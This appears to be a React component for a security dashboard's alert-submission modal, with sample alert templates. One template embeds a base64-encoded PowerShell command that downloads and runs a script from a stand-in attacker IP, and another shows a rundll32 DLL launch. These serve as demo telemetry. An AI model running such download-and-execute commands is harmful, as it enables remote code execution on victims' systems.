import React, { useState } from 'react';
import { 
  PlusCircle, 
  Code2, 
  Check, 
  AlertTriangle, 
  Sparkles, 
  X,
  FileCode,
  Copy
} from 'lucide-react';
import { SecurityAlertPayload } from '../types/sentinel';
import { validateSecurityAlert } from '../utils/alertValidator';

interface NewAlertModalProps {
  isOpen: boolean;
  onClose: () => void;
  onSubmit: (alert: SecurityAlertPayload) => Promise<void>;
}

const TEMPLATES: { name: string; alert: Partial<SecurityAlertPayload> }[] = [
  {
    name: 'Suspicious PowerShell Execution (Demo Alert 2)',
    alert: {
      alertId: 'SEC-4402',
      title: 'Suspicious PowerShell execution on FIN-SRV-07',
      severity: 'critical',
      timestamp: new Date().toISOString(),
      sourceIp: '10.0.12.78',
      destinationIp: '198.51.100.24',
      affectedAsset: 'FIN-SRV-07',
      userAccount: 'CORP\\svc-payroll',
      processName: 'powershell.exe',
      commandLine: 'powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTk4LjUxLjEwMC4yNDo4MDgwL3NjcmlwdHMvc2NyLnBzMScp',
      parentProcess: 'wmic.exe',
      detectionSource: 'Sysmon Event ID 1',
      tags: ['T1059.001', 'Finance-Subnet', 'PowerShell']
    }
  },
  {
    name: 'Cobalt Strike C2 Beacon Traffic',
    alert: {
      alertId: 'SEC-4415',
      title: 'Periodic HTTPS Beaconing to Suspicious Dynamic DNS',
      severity: 'high',
      timestamp: new Date().toISOString(),
      sourceIp: '10.0.12.99',
      destinationIp: '198.51.100.88',
      affectedAsset: 'FIN-DB-02',
      userAccount: 'SYSTEM',
      processName: 'rundll32.exe',
      commandLine: 'rundll32.exe C:\\ProgramData\\update.dll,EntryPoint',
      detectionSource: 'Network Threat Analytics',
      tags: ['T1071.001', 'C2', 'CobaltStrike']
    }
  },
  {
    name: 'AWS Root Account Console Login without MFA',
    alert: {
      alertId: 'SEC-4420',
      title: 'AWS Root Account Console Login Detected Without Hardware MFA',
      severity: 'high',
      timestamp: new Date().toISOString(),
      sourceIp: '203.0.113.45',
      affectedAsset: 'AWS-Root-Tenant-01',
      userAccount: 'root',
      detectionSource: 'AWS CloudTrail GuardDuty',
      tags: ['CloudSecurity', 'CredentialAccess', 'MFA-Bypass']
    }
  }
];

export const NewAlertModal: React.FC<NewAlertModalProps> = ({
  isOpen,
  onClose,
  onSubmit
}) => {
  const [jsonText, setJsonText] = useState(JSON.stringify(TEMPLATES[0].alert, null, 2));
  const [errorMsg, setErrorMsg] = useState<string | null>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);

  if (!isOpen) return null;

  const handleTemplateSelect = (tmpl: typeof TEMPLATES[0]) => {
    setJsonText(JSON.stringify(tmpl.alert, null, 2));
    setErrorMsg(null);
  };

  const handleFormSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMsg(null);

    let parsed: any;
    try {
      parsed = JSON.parse(jsonText);
    } catch (err: any) {
      setErrorMsg(`JSON Syntax Error: ${err.message}`);
      return;
    }

    const validation = validateSecurityAlert(parsed);
    if (!validation.valid || !validation.alert) {
      setErrorMsg(`Validation Error: ${validation.errors.join(', ')}`);
      return;
    }

    setIsSubmitting(true);
    try {
      await onSubmit(validation.alert);
      onClose();
    } catch (err: any) {
      setErrorMsg(err.message || 'Failed to submit alert');
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm">
      <div className="bg-[#0f172a] border border-slate-700 rounded-xl w-full max-w-2xl max-h-[90vh] flex flex-col shadow-2xl overflow-hidden">
        {/* Header */}
        <div className="px-6 py-4 border-b border-slate-800 flex items-center justify-between bg-[#0b1220]">
          <div className="flex items-center space-x-2.5">
            <PlusCircle className="w-5 h-5 text-cyan-400" />
            <h3 className="text-base font-bold text-white">
              Submit Security Alert (JSON)
            </h3>
          </div>
          <button
            onClick={onClose}
            className="p-1 rounded text-slate-400 hover:text-white hover:bg-slate-800 cursor-pointer"
          >
            <X className="w-5 h-5" />
          </button>
        </div>

        {/* Form Body */}
        <form onSubmit={handleFormSubmit} className="p-6 overflow-y-auto space-y-4 flex-1">
          {/* Quick Templates */}
          <div className="space-y-1.5">
            <label className="text-xs font-mono font-semibold uppercase text-slate-400">
              Select Sample Alert Template:
            </label>
            <div className="flex items-center space-x-2 flex-wrap gap-y-2">
              {TEMPLATES.map((tmpl, idx) => (
                <button
                  key={idx}
                  type="button"
                  onClick={() => handleTemplateSelect(tmpl)}
                  className="px-2.5 py-1 rounded bg-[#090e1a] hover:bg-slate-800 text-xs text-slate-300 hover:text-cyan-300 border border-slate-700 transition-colors cursor-pointer"
                >
                  {tmpl.name}
                </button>
              ))}
            </div>
          </div>

          {/* Raw JSON Editor */}
          <div className="space-y-1.5">
            <div className="flex items-center justify-between">
              <label className="text-xs font-mono font-semibold uppercase text-slate-300">
                Alert Telemetry Payload (JSON)
              </label>
              <span className="text-[11px] text-slate-500 font-mono">
                Mandatory: title, severity, affectedAsset
              </span>
            </div>
            <textarea
              rows={12}
              required
              value={jsonText}
              onChange={(e) => setJsonText(e.target.value)}
              className="w-full bg-[#070b14] border border-slate-700 rounded-lg p-3 font-mono text-xs text-cyan-300 focus:outline-none focus:border-cyan-500 leading-relaxed resize-none"
            />
          </div>

          {/* Error Message */}
          {errorMsg && (
            <div className="p-3 rounded-lg bg-rose-950/80 border border-rose-800/80 text-rose-300 text-xs flex items-center space-x-2">
              <AlertTriangle className="w-4 h-4 shrink-0 text-rose-400" />
              <span>{errorMsg}</span>
            </div>
          )}

          {/* Footer Actions */}
          <div className="flex items-center justify-end space-x-3 pt-3 border-t border-slate-800">
            <button
              type="button"
              onClick={onClose}
              className="px-4 py-2 rounded-lg bg-slate-800 hover:bg-slate-700 text-xs font-medium text-slate-300 border border-slate-700 cursor-pointer"
            >
              Cancel
            </button>

            <button
              type="submit"
              disabled={isSubmitting}
              className="flex items-center space-x-1.5 px-5 py-2 rounded-lg bg-cyan-600 hover:bg-cyan-500 text-white text-xs font-semibold shadow-md shadow-cyan-900/30 transition-all disabled:opacity-50 cursor-pointer"
            >
              <Check className="w-4 h-4" />
              <span>{isSubmitting ? 'Ingesting...' : 'Ingest & Trigger Recall'}</span>
            </button>
          </div>
        </form>
      </div>
    </div>
  );
};
